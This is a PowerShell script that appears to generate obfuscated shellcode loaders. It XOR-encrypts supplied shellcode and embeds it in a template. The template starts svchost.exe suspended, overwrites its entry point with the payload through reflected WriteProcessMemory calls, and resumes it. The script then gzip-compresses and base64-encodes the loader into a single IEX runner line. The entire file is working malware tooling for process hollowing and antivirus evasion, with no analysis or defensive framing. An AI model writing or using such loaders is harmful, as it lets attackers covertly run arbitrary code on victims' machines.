Param($shellcode,$filename)

$script = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure, $system_assembly)	
 	$var_unsafe_native_methods = $system_assembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}
function func_get_delegate_type {
	Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,[Parameter(Position = 1)] [Type] $var_return_type = [Void])
	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
	return $var_type_builder.CreateType()
}
$key = "<xor_key>"
[int[]] $xorbuf = <xor_shellcode>
$buf = for($i=0; $i -lt $xorbuf.Length; $i++){(($xorbuf[$i]) -bxor $key[$i % $key.Length])}
$sa = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
$si = $sa.GetType('Microsoft.Win32.NativeMethods+STARTUPINFO').GetConstructors().Invoke($null)
$pi = $sa.GetType('Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION').GetConstructors().Invoke($null)
$sa.GetType('Microsoft.Win32.NativeMethods').GetMethod("CreateProcess").Invoke($null, @($null, [System.Text.StringBuilder]::new("c:\windows\system32\svchost.exe"), $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $si, $pi)) | Out-Null
$bi = [System.Byte[]]::CreateInstance([System.Byte], 48)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address ntdll.dll ZwQueryInformationProcess $sa), (func_get_delegate_type @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([Int]))).Invoke($pi.hProcess, 0, $bi, $bi.Length, 0) | Out-Null
$imgBase = ([IntPtr]::new([BitConverter]::ToUInt64($bi, 0x08) + 0x10))
$addrBuf = [System.Byte[]]::CreateInstance([System.Byte], 0x200)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll ReadProcessMemory $sa), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool]))).Invoke($pi.hProcess, $imgBase, $addrBuf, 0x08, 0) | Out-Null
$svchostAddr = [BitConverter]::ToInt64($addrBuf, 0)
$svchostBase = [IntPtr]::new($svchostAddr)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll ReadProcessMemory $sa), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool]))).Invoke($pi.hProcess, $svchostBase, $addrBuf, $addrBuf.Length, 0) | Out-Null
$e_lfanew_offset = [BitConverter]::ToUInt32($addrBuf, 0x3c)
$opthdr = [BitConverter]::ToUInt32($addrBuf, $e_lfanew_offset + 0x28)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory $sa), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr]))).Invoke($pi.hProcess, [IntPtr]::new($svchostAddr + $opthdr), $buf, $buf.Length, [IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll ResumeThread $sa), (func_get_delegate_type @([IntPtr]))).Invoke($pi.hThread)
'@

$runner = @'
(New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream((New-Object System.IO.MemoryStream([System.Convert]::FromBase64String('<gz_stream>'),0,<gz_length>)),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()|IEX
'@

function xor {
    Param ($xorkey, $array)
    for($i=0; $i -lt $array.Count; $i++) {
        $array[$i] -bxor $xorkey[$i % $xorkey.Length]
    }
}

$buf = Get-Content $shellcode -Encoding Byte

$key = ((48..95) + (97..122) | Get-Random -Count 100 | %{[char]$_}) -join ""

$xorbuf = ((xor $key $buf) -join ",")

$script = $script.Replace("<xor_key>", $key).Replace("<xor_shellcode>", $xorbuf)

$byteArray = [System.Text.Encoding]::ASCII.GetBytes($script)

[System.IO.Stream]$memoryStream = New-Object System.IO.MemoryStream
[System.IO.Stream]$gzipStream = New-Object System.IO.Compression.GzipStream $memoryStream, ([System.IO.Compression.CompressionMode]::Compress)
$gzipStream.Write($ByteArray, 0, $ByteArray.Length)
$gzipStream.Close()
$memoryStream.Close()
[byte[]]$gzipStream = $memoryStream.ToArray()

$encodedGzipStream = [System.Convert]::ToBase64String($gzipStream)

$runner.Replace("<gz_stream>", $encodedGzipStream).Replace("<gz_length>", $gzipStream.Length) | Out-File -FilePath $filename
